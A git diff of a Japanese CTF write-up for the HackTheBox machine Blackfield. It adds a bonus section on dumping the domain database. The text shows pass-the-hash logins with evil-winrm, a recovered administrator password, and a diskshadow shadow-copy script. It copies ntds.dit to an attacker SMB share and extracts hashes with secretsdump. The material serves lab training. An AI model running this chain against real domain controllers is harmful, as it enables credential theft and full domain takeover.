@@ -249,7 +249,7 @@ luid 406458
 ```
 winrmでログイン成功！  
 ユーザフラグゲット
-```sh
+```powershell
 └─$ evil-winrm -i 10.129.194.101 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
                                         
 Evil-WinRM shell v3.7
@@ -273,10 +273,9 @@ Mode                LastWriteTime         Length Name
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> cat ../Desktop/user.txt
 3920bb317a0bef51027e2852be64b543
 ```
-ちなみにadministratorのntハッシュを取得したが、こちらはログイン失敗した  
+ちなみにadministratorのntハッシュも取得したが、こちらはログイン失敗した  
 多分lsassをダンプした以降にパスワードが変更されてそう
 ```sh
-
 == LogonSession ==
 authentication_id 153705 (25869)
 session_id 1
@@ -298,7 +297,7 @@ luid 153705
 
 ## STPE 5
 `Backup Operators`に所属していることを確認
-```sh
+```powershell
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /groups
 
 GROUP INFORMATION
@@ -319,7 +318,7 @@ Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 ```
 マシン「Return」の際は`SeBackupPrivilege`権限でrobocopyによるルートフラグコピーを実施したが、今回はアクセス拒否された  
 [他writeup](https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#beyond-root---efs)から、別プロセスがルートフラグをつかんでいるっぽいことが推測
-```sh
+```powershell
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy "C:\Users\administrator\Desktop" "C:\Users\svc_back_up\Documents\" "root.txt" /B /NFL /NDL /NJH /NJS
 
 2025/10/20 04:04:12 ERROR 5 (0x00000005) Copying File C:\Users\administrator\Desktop\root.txt
@@ -365,7 +364,7 @@ NL$KM:8801b205db707a0fef52df0696764ca4bd6e62d106631a7e312fa26df86c4250fc8d5ca4fc
 [*] Cleaning up...
 ```
 pypykatz上でデフォルトパスワード`###_ADM1N_3920_###`を確認  
-なんどadministratorのパスワードでログインできた！ルートフラグゲット
+なんとadministratorのパスワードでログインできた！ルートフラグゲット
 ```sh
 └─$ evil-winrm -i 10.129.165.239 -u administrator -p '###_ADM1N_3920_###'           
                                         
@@ -378,4 +377,109 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../desktop/root.txt
 4375a629c7c67c8e29db269060c955cb
+```
+
+## おまけ
+今回はレジストリsystemとsecurityからadministratorのdefaultPasswordを取得できたが、ntdsをダンプする手法もある  
+[リンク](https://pentestlab.blog/tag/diskshadow/)を参考  
+vssadminの実行には管理者権限が必要・wbadminは実行エラーだったので、diskshadowコマンドを実行する  
+diskshadowコマンドはスクリプトモードで動作するため、スクリプトを作成する  
+```sh
+└─$ cat diskshadow.txt 
+set metadata C:\windows\temp\meta.cab
+set context persistent nowriters
+add volume c: alias test
+create
+expose %test% z:
+
+└─$ unix2dos diskshadow.txt 
+unix2dos: converting file diskshadow.txt to DOS format...
+
+└─$ impacket-smbserver share . -smb2support
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+```
+zドライブ上にボリュームシャドーコピーが作成された
+```powershell
+*Evil-WinRM* PS C:\users\svc_backup\documents> copy \\10.10.16.15\share\diskshadow.txt .
+
+*Evil-WinRM* PS C:\users\svc_backup\documents> diskshadow.exe /s diskshadow.txt
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC01,  10/20/2025 6:44:27 PM
+
+-> set metadata C:\windows\temp\meta.cab
+The existing file will be overwritten.
+-> set context persistent nowriters
+-> add volume c: alias test
+-> create
+Alias test for shadow ID {1d96380d-441a-498a-b44b-157a9008afbd} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {89db8686-5e19-4177-9d23-54aa423292ee} set as environment variable.
+
+Querying all shadow copies with the shadow copy set ID {89db8686-5e19-4177-9d23-54aa423292ee}
+
+        * Shadow copy ID = {1d96380d-441a-498a-b44b-157a9008afbd}               %test%
+                - Shadow copy set: {89db8686-5e19-4177-9d23-54aa423292ee}       %VSS_SHADOW_SET%
+                - Original count of shadow copies = 1
+                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
+                - Creation time: 10/20/2025 6:44:29 PM
+                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3
+                - Originating machine: DC01.BLACKFIELD.local
+                - Service machine: DC01.BLACKFIELD.local
+                - Not exposed
+                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+                - Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-> expose %test% z:
+-> %test% = {1d96380d-441a-498a-b44b-157a9008afbd}
+The shadow copy was successfully exposed as z:\.
+->
+
+*Evil-WinRM* PS C:\users\svc_backup\documents> ls z:\
+
+
+    Directory: z:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        5/26/2020   5:38 PM                PerfLogs
+d-----         6/3/2020   9:47 AM                profiles
+d-r---        3/19/2020  11:08 AM                Program Files
+d-----         2/1/2020  11:05 AM                Program Files (x86)
+d-r---       10/20/2025   4:04 AM                Users
+d-----        9/21/2020   4:29 PM                Windows
+-a----        2/28/2020   4:36 PM            447 notes.txt
+````
+robocopyコマンドでntds.ditをコピー、kaliに転送
+```powershell
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy z:\windows\ntds\ . ntds.dit /b /np /njh /njs
+
+                           1    z:\windows\ntds\
+            New File              18.0 m        ntds.dit
+
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> copy ntds.dit \\10.10.16.15\share\
+```
+systemレジストリを使用して、クレデンシャルダンプできた
+```sh
+└─$ impacket-secretsdump -system SYSTEM -ntds ntds.dit -just-dc-ntlm LOCAL | grep -i 'administrator'
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+```
+ちなみに作成したvssは削除可能
+```powershell
+*Evil-WinRM* PS C:\users\svc_backup\documents> diskshadow.exe /s del.txt
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC01,  10/20/2025 6:26:38 PM
+
+-> delete shadows id {1d96380d-441a-498a-b44b-157a9008afbd}
+Deleting shadow copy {1d96380d-441a-498a-b44b-157a9008afbd}...
+
+1 shadow copy deleted.
 ```
